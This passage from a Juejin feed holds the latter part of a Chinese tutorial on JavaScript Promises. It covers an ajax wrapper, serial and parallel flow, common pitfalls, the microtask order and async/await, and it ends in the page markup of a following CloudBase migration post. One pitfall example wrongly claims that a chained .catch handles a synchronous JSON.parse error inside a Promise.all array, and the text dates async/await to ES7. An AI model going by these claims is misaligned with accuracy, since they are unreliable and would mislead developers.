      xhr.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">'Content-Type'</span>, <span class="hljs-string">'application/x-www-form-urlencoded'</span>);
    }
    <span class="hljs-comment">// 响应处理</span>
    xhr.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
      <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">status</span> &gt;= <span class="hljs-number">200</span> &amp;&amp; xhr.<span class="hljs-property">status</span> &lt; <span class="hljs-number">300</span>) {
        <span class="hljs-keyword">try</span> {
          <span class="hljs-keyword">const</span> res = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(xhr.<span class="hljs-property">responseText</span>); <span class="hljs-comment">// 解析JSON</span>
          <span class="hljs-title function_">resolve</span>(res);
        } <span class="hljs-keyword">catch</span> (err) {
          <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'响应数据解析失败：'</span> + err.<span class="hljs-property">message</span>));
        }
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`请求失败：状态码<span class="hljs-subst">${xhr.status}</span>，<span class="hljs-subst">${xhr.statusText}</span>`</span>));
      }
    };
    <span class="hljs-comment">// 网络错误</span>
    xhr.<span class="hljs-property">onerror</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
      <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'网络错误：无法连接到服务器'</span>));
    };
    <span class="hljs-comment">// 发送请求</span>
    <span class="hljs-keyword">if</span> (method.<span class="hljs-title function_">toUpperCase</span>() === <span class="hljs-string">'POST'</span>) {
      xhr.<span class="hljs-title function_">send</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>(data).<span class="hljs-title function_">toString</span>());
    } <span class="hljs-keyword">else</span> {
      xhr.<span class="hljs-title function_">send</span>();
    }
  });
}

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-title function_">ajax</span>({
  <span class="hljs-attr">url</span>: <span class="hljs-string">'/api/user'</span>,
  <span class="hljs-attr">method</span>: <span class="hljs-string">'GET'</span>,
  <span class="hljs-attr">data</span>: { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span> }
})
  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'请求成功：'</span>, res))
  .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'请求失败：'</span>, err.<span class="hljs-property">message</span>));
</code></pre>
<h4 data-id="heading-46">2. 封装定时器（Promise 版）</h4>
<p>将 setTimeout/setInterval 封装为 Promise，支持 async/await 调用，解决定时器嵌套问题：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">/**
 * Promise 版定时器（延迟执行）
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">time</span> - 延迟时间（毫秒）
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">*</span>} <span class="hljs-variable">value</span> - 延迟后返回的值
 * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">Promise</span>}
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">delay</span>(<span class="hljs-params">time, value</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> {
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">resolve</span>(value), time);
  });
}

<span class="hljs-comment">// 使用示例：async/await 调用</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">doTask</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'开始执行任务'</span>);
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">delay</span>(<span class="hljs-number">1000</span>); <span class="hljs-comment">// 延迟1秒</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'1秒后执行下一步'</span>);
  <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">delay</span>(<span class="hljs-number">1000</span>, <span class="hljs-string">'延迟2秒的返回值'</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data); <span class="hljs-comment">// 延迟2秒的返回值</span>
}
<span class="hljs-title function_">doTask</span>();
</code></pre>
<h4 data-id="heading-47">3. 异步流程控制：串行/并行执行</h4>
<h5 data-id="heading-48">3.1 串行执行（依次执行，后一个依赖前一个结果）</h5>
<p>适合有顺序依赖的异步操作（如先获取token，再用token获取用户信息）：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 模拟两个有依赖的异步操作</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getToken</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">resolve</span>(<span class="hljs-string">'user_token_123'</span>), <span class="hljs-number">1000</span>));
}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getUserInfo</span>(<span class="hljs-params">token</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">resolve</span>({ token, <span class="hljs-attr">name</span>: <span class="hljs-string">'张三'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">18</span> }), <span class="hljs-number">1000</span>));
}

<span class="hljs-comment">// 串行执行：async/await 更简洁（基于Promise）</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getUserData</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> token = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getToken</span>(); <span class="hljs-comment">// 先获取token</span>
  <span class="hljs-keyword">const</span> userInfo = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getUserInfo</span>(token); <span class="hljs-comment">// 再用token获取用户信息</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'用户数据：'</span>, userInfo);
}
<span class="hljs-title function_">getUserData</span>(); <span class="hljs-comment">// 总耗时2秒</span>
</code></pre>
<h5 data-id="heading-49">3.2 并行执行（同时执行，无依赖）</h5>
<p>适合无依赖的异步操作，提升执行效率（如同时请求多个无关联的接口）：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 模拟3个无依赖的接口请求</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getArticleList</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-title function_">delay</span>(<span class="hljs-number">1000</span>, <span class="hljs-string">'文章列表'</span>); }
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getCommentList</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-title function_">delay</span>(<span class="hljs-number">1000</span>, <span class="hljs-string">'评论列表'</span>); }
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getLikeList</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-title function_">delay</span>(<span class="hljs-number">1000</span>, <span class="hljs-string">'点赞列表'</span>); }

<span class="hljs-comment">// 并行执行：Promise.all 实现，总耗时1秒（而非3秒）</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getHomeData</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">'总耗时'</span>);
  <span class="hljs-comment">// 同时执行，等待所有完成</span>
  <span class="hljs-keyword">const</span> [articles, comments, likes] = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([
    <span class="hljs-title function_">getArticleList</span>(),
    <span class="hljs-title function_">getCommentList</span>(),
    <span class="hljs-title function_">getLikeList</span>()
  ]);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'首页数据：'</span>, { articles, comments, likes });
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">'总耗时'</span>); <span class="hljs-comment">// 总耗时：约1000ms</span>
}
<span class="hljs-title function_">getHomeData</span>();
</code></pre>
<h3 data-id="heading-50">⚠️ 六、Promise 常见坑与避坑指南</h3>
<h4 data-id="heading-51">1. 忘记写 return 导致链式调用断链</h4>
<p><strong>问题</strong>：<code>.then()</code> 中未写 return，导致下一个 <code>.then()</code> 接收的参数是 <code>undefined</code>，且执行时机提前（因为返回的是默认的 Promise.resolve(undefined)）。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 错误示例</span>
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-number">1</span>)
  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num); <span class="hljs-comment">// 1</span>
    <span class="hljs-comment">// 忘记return，默认返回undefined</span>
  })
  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num)); <span class="hljs-comment">// undefined（立即执行）</span>

<span class="hljs-comment">// 正确示例</span>
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-number">1</span>)
  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num); <span class="hljs-comment">// 1</span>
    <span class="hljs-keyword">return</span> num + <span class="hljs-number">1</span>; <span class="hljs-comment">// 必须写return</span>
  })
  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num)); <span class="hljs-comment">// 2</span>
</code></pre>
<h4 data-id="heading-52">2. 错误未被捕获（控制台报 UnhandledPromiseRejection）</h4>
<p><strong>问题</strong>：Promise 被 reject 后，没有任何 <code>.catch()</code> 或 <code>.then()</code> 的 onRejected 处理，导致浏览器抛出未捕获错误。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 错误示例：无错误处理</span>
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'未捕获的错误'</span>)); <span class="hljs-comment">// 控制台报错：UnhandledPromiseRejection</span>

<span class="hljs-comment">// 正确示例：必须添加catch</span>
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'已捕获的错误'</span>))
  .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err.<span class="hljs-property">message</span>)); <span class="hljs-comment">// 正常输出</span>
</code></pre>
<h4 data-id="heading-53">3. 认为 Promise 执行器是异步的</h4>
<p><strong>问题</strong>：Promise 构造函数的执行器函数是<strong>同步立即执行</strong>的，内部的异步操作才是异步的，容易导致变量赋值顺序错误。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 错误认知：认为执行器是异步的</span>
<span class="hljs-keyword">let</span> a = <span class="hljs-number">0</span>;
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {
  a = <span class="hljs-number">1</span>; <span class="hljs-comment">// 同步执行，立即赋值</span>
  <span class="hljs-title function_">resolve</span>();
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a); <span class="hljs-comment">// 1（而非0）</span>

<span class="hljs-comment">// 正确理解：执行器同步，内部操作异步</span>
<span class="hljs-keyword">let</span> b = <span class="hljs-number">0</span>;
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {
  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
    b = <span class="hljs-number">1</span>; <span class="hljs-comment">// 异步执行，1秒后赋值</span>
    <span class="hljs-title function_">resolve</span>();
  }, <span class="hljs-number">1000</span>);
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(b); <span class="hljs-comment">// 0（立即输出）</span>
</code></pre>
<h4 data-id="heading-54">4. Promise.all 传入非 Promise 数组</h4>
<p><strong>问题</strong>：<code>Promise.all</code> 传入的数组中包含普通值，会被自动转为 <code>Promise.resolve(普通值)</code>，看似没问题，但如果包含<strong>同步错误</strong>，会立即触发失败。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 无害情况：普通值被转为成功的Promise</span>
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-number">3</span>)])
  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res)); <span class="hljs-comment">// [1,2,3]</span>

<span class="hljs-comment">// 危险情况：同步错误立即触发失败</span>
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">'{'</span>)]) <span class="hljs-comment">// JSON.parse同步报错</span>
  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res))
  .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err.<span class="hljs-property">message</span>)); <span class="hljs-comment">// Unexpected token } in JSON at position 1</span>
</code></pre>
<p><strong>避坑</strong>：确保 <code>Promise.all</code> 数组中的元素要么是 Promise 实例，要么是安全的普通值（无同步错误）。</p>
<h4 data-id="heading-55">5. 多次调用 resolve/reject 无效</h4>
<p><strong>问题</strong>：认为多次调用 resolve/reject 可以改变 Promise 状态，实则状态一旦定型，后续调用均无效。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
  <span class="hljs-title function_">resolve</span>(<span class="hljs-string">'第一次resolve'</span>);
  <span class="hljs-title function_">reject</span>(<span class="hljs-string">'reject'</span>); <span class="hljs-comment">// 无效</span>
  <span class="hljs-title function_">resolve</span>(<span class="hljs-string">'第二次resolve'</span>); <span class="hljs-comment">// 无效</span>
})
  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res)) <span class="hljs-comment">// 第一次resolve</span>
  .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err)); <span class="hljs-comment">// 不会执行</span>
</code></pre>
<h3 data-id="heading-56">⏫ 七、Promise 高级知识点：微任务与事件循环</h3>
<p>Promise 的回调函数（<code>.then()</code>/<code>.catch()</code>/<code>.finally()</code>）属于<strong>微任务（Microtask）</strong>，这是 Promise 执行时机的关键，也是前端面试的高频考点。</p>
<h4 data-id="heading-57">1. 微任务与宏任务的区别</h4>
<p>浏览器的事件循环中，任务分为<strong>宏任务（Macrotask）</strong> 和<strong>微任务（Microtask）</strong>，执行顺序为：<strong>先执行同步代码 → 执行所有微任务 → 执行一个宏任务 → 再执行所有微任务 → 循环</strong>。</p>
<ul>
<li><strong>宏任务</strong>：setTimeout、setInterval、AJAX、DOM 事件、script 整体代码；</li>
<li><strong>微任务</strong>：Promise 回调、async/await、MutationObserver、queueMicrotask。</li>
</ul>
<h4 data-id="heading-58">2. Promise 微任务执行示例</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'1. 同步代码开始'</span>); <span class="hljs-comment">// 同步</span>

<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'4. 宏任务：setTimeout'</span>); <span class="hljs-comment">// 宏任务，最后执行</span>
}, <span class="hljs-number">0</span>);

<span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'2. Promise执行器：同步'</span>); <span class="hljs-comment">// 同步</span>
  <span class="hljs-title function_">resolve</span>();
}).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'3. 微任务：Promise.then'</span>); <span class="hljs-comment">// 微任务，同步后执行</span>
});

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'5. 同步代码结束'</span>); <span class="hljs-comment">// 同步</span>
</code></pre>
<p><strong>输出顺序</strong>：1→2→5→3→4（核心：微任务在宏任务前执行）。</p>
<h3 data-id="heading-59">📕 八、Promise 与 async/await 结合使用</h3>
<p>async/await 是 ES7 引入的<strong>Promise 语法糖</strong>，它让异步代码的写法<strong>完全同步化</strong>，是目前前端异步编程的<strong>最优方案</strong>，但它的底层依然是 Promise，必须掌握 Promise 才能真正理解 async/await。</p>
<h4 data-id="heading-60">1. 核心规则</h4>
<ul>
<li><code>async</code> 修饰的函数，返回值一定是 Promise 实例（即使返回普通值，也会被转为 Promise.resolve(普通值)）；</li>
<li><code>await</code> 只能在 <code>async</code> 函数中使用，用于等待 Promise 定型，<strong>暂停函数执行</strong>，直到 Promise 返回结果；</li>
<li><code>await</code> 后面可以跟任意值，若不是 Promise，会被自动转为 Promise.resolve(值)；</li>
<li>错误处理：使用 <code>try/catch</code> 捕获 <code>await</code> 后的 Promise 错误（等价于 Promise 的 <code>.catch()</code>）。</li>
</ul>
<h4 data-id="heading-61">2. 结合使用示例（最简洁的异步代码）</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 模拟异步操作</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchData</span> = (<span class="hljs-params"/>) =&gt; <span class="hljs-title function_">delay</span>(<span class="hljs-number">1000</span>, <span class="hljs-string">'获取到数据'</span>);
<span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchUser</span> = (<span class="hljs-params"/>) =&gt; <span class="hljs-title function_">delay</span>(<span class="hljs-number">1000</span>, { <span class="hljs-attr">name</span>: <span class="hljs-string">'张三'</span> });

<span class="hljs-comment">// async/await 写法，同步化流程</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'开始执行'</span>);
    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchData</span>(); <span class="hljs-comment">// 等待第一个异步操作</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data); <span class="hljs-comment">// 获取到数据</span>
    <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchUser</span>(); <span class="hljs-comment">// 等待第二个异步操作</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user); <span class="hljs-comment">// { name: '张三' }</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'所有操作完成'</span>);
  } <span class="hljs-keyword">catch</span> (err) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'错误：'</span>, err.<span class="hljs-property">message</span>); <span class="hljs-comment">// 捕获所有异步错误</span>
  } <span class="hljs-keyword">finally</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'收尾操作'</span>); <span class="hljs-comment">// 无论成功/失败都执行</span>
  }
}

<span class="hljs-title function_">main</span>();
</code></pre>
<h3 data-id="heading-62">📌 九、总结</h3>
<ol>
<li>Promise 是 ES6 核心的异步编程解决方案，<strong>解决了回调地狱问题</strong>，提供了统一的异步接口和集中的错误处理机制；</li>
<li>Promise 有三种不可逆状态：pending、fulfilled、rejected，仅能通过 resolve/reject 完成两次状态转换，状态定型后不可修改；</li>
<li>实例方法 <code>.then()</code>/<code>.catch()</code>/<code>.finally()</code> 支持链式调用，核心原因是<strong>每个方法都返回新的 Promise 实例</strong>，<code>.catch()</code> 统一捕获错误，<code>.finally()</code> 处理通用收尾；</li>
<li>构造函数静态方法是异步流程控制的核心：<code>all</code>（所有成功）、<code>race</code>（第一个完成）、<code>allSettled</code>（所有完成）、<code>any</code>（第一个成功）、<code>resolve</code>/<code>reject</code>（快速创建）；</li>
<li>Promise 回调属于<strong>微任务</strong>，执行顺序在同步代码后、宏任务前，这是理解 Promise 执行时机的关键；</li>
<li>async/await 是 Promise 的语法糖，让异步代码同步化，是目前最优的异步写法，但底层依赖 Promise；</li>
<li>开发中避免常见坑：忘记 return 断链、未捕获错误、混淆执行器同步特性、多次调用 resolve/reject；</li>
<li>Promise 是现代前端开发的必备技能，是 Vue、React 等框架异步操作、接口请求、状态管理的基础，也是前端面试的高频考点。</li>
</ol>
<p>掌握 Promise 不仅能写出更优雅、更易维护的异步代码，更能理解现代前端异步编程的底层逻辑，为后续学习 async/await、事件循环、前端工程化打下坚实的基础。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[LeanCloud停服&CloudBase 迁移方案]]></title>    <link>https://juejin.cn/post/7602940720690429998</link>    <guid>https://juejin.cn/post/7602940720690429998</guid>    <pubDate>2026-02-05T03:12:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602940720690429998" data-draft-id="7602562585099878434" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="LeanCloud停服&amp;CloudBase 迁移方案"/> <meta itemprop="keywords" content="后端,前端"/> <meta itemprop="datePublished" content="2026-02-05T03:12:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="腾讯云开发CloudBase"/> <meta itemprop="url" content="https://juejin.cn/user/2963939080036493"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            LeanCloud停服&amp;CloudBase 迁移方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2963939080036493/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    腾讯云开发CloudBase
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T03:12:56.000Z" title="Thu Feb 05 2026 03:12:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body 